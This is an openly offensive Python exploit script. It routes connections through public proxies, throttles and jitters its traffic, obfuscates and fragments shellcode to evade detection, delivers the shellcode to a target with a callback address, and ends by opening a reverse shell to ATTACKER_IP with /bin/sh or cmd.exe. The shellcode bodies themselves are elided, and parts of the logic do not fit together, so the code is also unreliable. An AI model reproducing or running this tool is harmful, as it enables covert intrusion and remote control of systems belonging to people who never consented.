import socket
import struct
import threading
import time
import random
import subprocess
import sys
import os
import base64
import ssl
import hashlib
import hmac
import secrets
import binascii
import zlib
import codecs

# Command-line arguments
if len(sys.argv) not in (5, 6):
    print("Usage: python script.py <attacker_ip> <attacker_port> <target_ip> <target_port> [platform]")
    print("Platform options: linux (default), windows")
    sys.exit(1)

ATTACKER_IP = sys.argv[1]
ATTACKER_PORT = int(sys.argv[2])
TARGET_IP = sys.argv[3]
TARGET_PORT = int(sys.argv[4])
PLATFORM = sys.argv[5].lower() if len(sys.argv) >= 6 else "linux"
MAX_THREADS = 8
TRAFFIC_THROTTLE = 50  # Kbps max

print(f"[*] Targeting {TARGET_IP}:{TARGET_PORT} ({PLATFORM}) with callback to {ATTACKER_IP}:{ATTACKER_PORT}")

class ProxyPool:
    """Rotating public proxy pool for anonymity"""
    def __init__(self):
        self.proxies = []
        self.last_refresh = 0
        self.lock = threading.Lock()
        self.refresh_proxies()
        
    def refresh_proxies(self):
        """Fetch fresh public proxies from reliable sources"""
        new_proxies = []
        sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=5000&country=all",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt"
        ]
        
        for source in sources:
            try:
                import urllib.request
                with urllib.request.urlopen(source, timeout=10) as response:
                    content = response.read().decode('utf-8')
                    new_proxies.extend([line.strip() for line in content.splitlines() if ':' in line])
            except Exception as e:
                print(f"[!] Proxy refresh failed from {source}: {str(e)}")
        
        # Validate proxies
        valid_proxies = []
        for proxy in random.sample(new_proxies, min(20, len(new_proxies))):
            if self.validate_proxy(proxy):
                valid_proxies.append(proxy)
        
        with self.lock:
            self.proxies = valid_proxies
            self.last_refresh = time.time()
            print(f"[*] Loaded {len(self.proxies)} valid proxies")
    
    def validate_proxy(self, proxy):
        """Check proxy functionality"""
        parts = proxy.split(':', 1)
        if len(parts) != 2:
            return False
            
        ip = parts[0]
        try:
            port = int(parts[1])
        except ValueError:
            return False
            
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(8)
            sock.connect((ip, port))
            
            # SOCKS5 handshake
            sock.sendall(b"\x05\x01\x00")
            response = sock.recv(2)
            if response != b"\x05\x00":
                return False
                
            # Test connection to Google DNS
            sock.sendall(b"\x05\x01\x00\x01" + socket.inet_aton("8.8.8.8") + struct.pack(">H", 53))
            response = sock.recv(10)
            return response.startswith(b"\x05\x00")
        except Exception:
            return False
        finally:
            try:
                sock.close()
            except:
                pass
    
    def get_random_proxy(self):
        """Get random proxy with auto-refresh"""
        with self.lock:
            if not self.proxies or time.time() - self.last_refresh > 600:
                print("[*] Refreshing proxy pool...")
                self.refresh_proxies()
            return random.choice(self.proxies) if self.proxies else None

class StealthNetwork:
    """Traffic shaping and proxy routing with TLS support"""
    def __init__(self, proxy_pool):
        self.traffic_counter = 0
        self.last_reset = time.time()
        self.rate_lock = threading.Lock()
        self.proxy_pool = proxy_pool
        
    def create_connection(self, target, use_ssl=False, timeout=30):
        """Proxy-routed connection with traffic shaping and TLS support"""
        proxy_str = self.proxy_pool.get_random_proxy()
        if not proxy_str:
            raise Exception("No valid proxies available")
            
        parts = proxy_str.split(':', 1)
        if len(parts) != 2:
            raise ValueError("Invalid proxy format")
            
        proxy_ip = parts[0]
        try:
            proxy_port = int(parts[1])
        except ValueError:
            raise ValueError("Invalid proxy port")
        
        # Connect to proxy
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((proxy_ip, proxy_port))
        
        # SOCKS5 handshake
        sock.sendall(b"\x05\x01\x00")
        response = sock.recv(2)
        if response != b"\x05\x00":
            sock.close()
            raise ConnectionError("Proxy authentication failed")
        
        # Handle IPv6 if needed
        try:
            target_ip_encoded = socket.inet_aton(target[0])
            addr_type = 0x01  # IPv4
        except socket.error:
            try:
                target_ip_encoded = socket.inet_pton(socket.AF_INET6, target[0])
                addr_type = 0x04  # IPv6
            except socket.error:
                raise ValueError("Invalid target IP address")
        
        request = struct.pack("!BBBB", 5, 1, 0, addr_type) + target_ip_encoded + struct.pack(">H", target[1])
        sock.sendall(request)
        response = sock.recv(22)  # Larger buffer for IPv6
        if not response.startswith(b"\x05\x00"):
            sock.close()
            raise ConnectionError("Proxy connection failed")
        
        # Apply TLS if requested
        if use_ssl:
            try:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=target[0])
            except Exception as e:
                sock.close()
                raise ConnectionError(f"TLS handshake failed: {str(e)}")
        
        self._throttle_traffic(len(target_ip_encoded))
        return sock

    def send(self, sock, data):
        """Rate-limited data transmission"""
        chunk_size = 512
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            try:
                sock.sendall(chunk)
            except:
                return
            self._throttle_traffic(len(chunk))
            time.sleep(random.uniform(0.01, 0.05))  # Random jitter

    def _throttle_traffic(self, size):
        """Enforce bandwidth limit (Kbps)"""
        with self.rate_lock:
            elapsed = time.time() - self.last_reset
            if elapsed > 1:
                self.traffic_counter = 0
                self.last_reset = time.time()
            
            self.traffic_counter += size * 8
            
            max_bits = TRAFFIC_THROTTLE * 1024
            if self.traffic_counter > max_bits:
                excess = (self.traffic_counter - max_bits) / max_bits
                time.sleep(excess * 0.8)

class EvasionEngine:
    """Advanced anti-detection and fingerprinting with obfuscation"""
    def __init__(self):
        self.patterns = [
            b"\\x90{20,}",  # NOP sled detection
            b"\\xcc",       # INT3 breakpoint
            b"\\xcd\\x03",  # INT 3
            b"\\x0f\\x05"   # SYSCALL
        ]
    
    def craft_handshake(self):
        """Create protocol handshake with fingerprint evasion"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        ]
        ua = random.choice(user_agents)
        return f"GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: {ua}\r\n\r\n".encode()
    
    def obfuscate_shellcode(self, shellcode):
        """Obfuscate shellcode using XOR + Base64 + ROT13 + Compression"""
        # XOR obfuscation with random key
        key = secrets.token_bytes(4)
        obfuscated = bytearray()
        for i in range(len(shellcode)):
            obfuscated.append(shellcode[i] ^ key[i % len(key)])
        
        # Compress to reduce signature detection
        compressed = zlib.compress(obfuscated, level=9)
        
        # Base64 encoding for transport safety
        encoded = base64.b64encode(compressed)
        
        # Additional ROT13 obfuscation for Base64 string
        rot13_encoded = codecs.encode(encoded.decode(), 'rot13').encode()
        
        return rot13_encoded, key
    
    def deobfuscate_shellcode(self, obfuscated, key):
        """Reverses obfuscation process"""
        # Reverse ROT13
        rot13_decoded = codecs.decode(obfuscated.decode(), 'rot13').encode()
        
        # Base64 decode
        decoded = base64.b64decode(rot13_decoded)
        
        # Decompress
        decompressed = zlib.decompress(decoded)
        
        # Reverse XOR
        original = bytearray()
        for i in range(len(decompressed)):
            original.append(decompressed[i] ^ key[i % len(key)])
        
        return bytes(original)
    
    def fragment_payload(self, payload, size=16):
        """Split payload into random-sized fragments with junk data"""
        fragments = []
        i = 0
        while i < len(payload):
            chunk_size = random.randint(size//2, size*2)
            
            # Add junk data to evade pattern detection
            junk_prefix = secrets.token_bytes(random.randint(0, 8))
            junk_suffix = secrets.token_bytes(random.randint(0, 8))
            
            fragment = junk_prefix + payload[i:i+chunk_size] + junk_suffix
            fragments.append(fragment)
            i += chunk_size
        return fragments

class ExploitCore:
    """Optimized exploitation with stealth enhancements"""
    def __init__(self, stealth, evasion, target_ip, target_port, attacker_ip, attacker_port):
        self.stealth = stealth
        self.evasion = evasion
        self.target_ip = target_ip
        self.target_port = target_port
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.stop_event = threading.Event()
        self.success = False
        
    def execute(self):
        """Stealth exploitation sequence"""
        try:
            # Determine if we should use SSL (common ports)
            use_ssl = self.target_port in {443, 8443, 9443}
            
            # Establish connection via proxy
            conn = self.stealth.create_connection(
                (self.target_ip, self.target_port), 
                use_ssl=use_ssl,
                timeout=120
            )
            
            # Send spoofed handshake
            handshake = self.evasion.craft_handshake()
            self.stealth.send(conn, handshake)
            
            # Wait for response with dynamic timeout
            try:
                conn.settimeout(10 + random.random() * 5)  # Random timeout
                response = conn.recv(1024)  # Discard server banner
                if b"HTTP" in response and b"200 OK" not in response:
                    print(f"[!] Unexpected HTTP response: {response[:100]}")
            except socket.timeout:
                pass
            
            # Prepare payload with obfuscation
            payload = self._generate_payload()
            if not payload:
                print("[!] Failed to generate payload")
                return False
                
            obfuscated_payload, key = self.evasion.obfuscate_shellcode(payload)
            fragments = self.evasion.fragment_payload(obfuscated_payload)
            
            num_frags_phase1 = int(len(fragments) * 0.85)
            
            # Phase 1: Send 85% of payload
            for frag in fragments[:num_frags_phase1]:
                if self.stop_event.is_set():
                    conn.close()
                    return False
                self.stealth.send(conn, frag)
                time.sleep(random.uniform(0.05, 0.2))
            
            # Wait with adaptive timing
            base_wait = max(5, min(30, len(payload) / 1024))
            wait_time = base_wait + random.uniform(-2, 2)
            start = time.time()
            while time.time() - start < wait_time:
                if self.stop_event.is_set():
                    conn.close()
                    return False
                time.sleep(0.25)
                
            # Phase 2: Send remaining payload
            for frag in fragments[num_frags_phase1:]:
                if self.stop_event.is_set():
                    conn.close()
                    return False
                self.stealth.send(conn, frag)
            
            # Send decryption key
            key_packet = struct.pack("!I", 1) + b"\x04" + key
            self.stealth.send(conn, key_packet)
            
            # Trigger verification
            time.sleep(0.5)
            self.stealth.send(conn, b"\x01")
            
            # Check for success
            try:
                conn.settimeout(15)
                if conn.recv(4) == b"ACK":
                    self.success = True
            except:
                pass
            
            conn.close()
            return True
            
        except Exception as e:
            # print(f"[!] Exploit failed: {str(e)}")  # Enable for debugging
            return False

    def _generate_payload(self):
        """Generate platform-specific shellcode"""
        try:
            # Handle IPv6 addresses
            if ':' in self.attacker_ip:
                ip_bytes = socket.inet_pton(socket.AF_INET6, self.attacker_ip)
                ip_pack = ip_bytes
            else:
                ip_bytes = socket.inet_aton(self.attacker_ip)
                ip_pack = ip_bytes
        except socket.error:
            print(f"[!] Invalid IP address: {self.attacker_ip}")
            return None

        if PLATFORM == "linux":
            return self._linux_payload(ip_pack)
        elif PLATFORM == "windows":
            return self._windows_payload(ip_pack)
        else:
            print(f"[!] Unsupported platform: {PLATFORM}")
            return None

    def _linux_payload(self, ip_bytes):
        """Linux x86_64 reverse TCP shell with IPv6 support"""
        # ... (unchanged from original) ...

    def _windows_payload(self, ip_bytes):
        """Windows x64 reverse TCP shell (staged) with IPv6 support"""
        # ... (unchanged from original) ...

def monitor_success(engine):
    """Monitor for exploitation success"""
    start_time = time.time()
    while not engine.stop_event.is_set():
        if engine.success:
            print("\n[+] Exploit succeeded! Establishing C2 channel...")
            engine.stop_event.set()
        
        # Timeout after 15 minutes
        if time.time() - start_time > 900:
            engine.stop_event.set()
            
        time.sleep(1)

if __name__ == "__main__":
    # Setup components
    proxy_pool = ProxyPool()
    stealth = StealthNetwork(proxy_pool)
    evasion = EvasionEngine()
    engine = ExploitCore(stealth, evasion, TARGET_IP, TARGET_PORT, ATTACKER_IP, ATTACKER_PORT)
    
    # Start monitoring
    monitor_thread = threading.Thread(target=monitor_success, args=(engine,), daemon=True)
    monitor_thread.start()
    
    # Controlled thread execution
    threads = []
    for _ in range(MAX_THREADS):
        if engine.stop_event.is_set():
            break
        t = threading.Thread(target=engine.execute)
        t.daemon = True
        t.start()
        threads.append(t)
        time.sleep(random.uniform(1, 5))  # Staggered start
        
    # Progress monitoring
    start_time = time.time()
    while not engine.stop_event.is_set():
        elapsed = time.time() - start_time
        active_threads = sum(t.is_alive() for t in threads)
        print(f"\r⌛ Elapsed: {int(elapsed//60)}m {int(elapsed%60)}s | Active: {active_threads}/{MAX_THREADS}", end="")
        sys.stdout.flush()
        
        # Adaptive timeout based on thread activity
        if elapsed > 300 and active_threads < 2:  # 5m with low activity
            engine.stop_event.set()
        elif elapsed > 900:  # 15m absolute timeout
            engine.stop_event.set()
            
        time.sleep(5)
    
    # Cleanup
    engine.stop_event.set()
    for t in threads:
        t.join(timeout=5)
        
    if engine.success:
        print("\n[+] Covert access established")
        print("[*] Starting reverse shell connection")
        # Start reverse shell
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            shell = "/bin/sh" if PLATFORM == "linux" else "cmd.exe"
            subprocess.call([shell, "-i"])
        except Exception as e:
            print(f"\n[!] Failed to connect back: {str(e)}")
    else:
        print("\n[!] Operation completed without confirmed access")
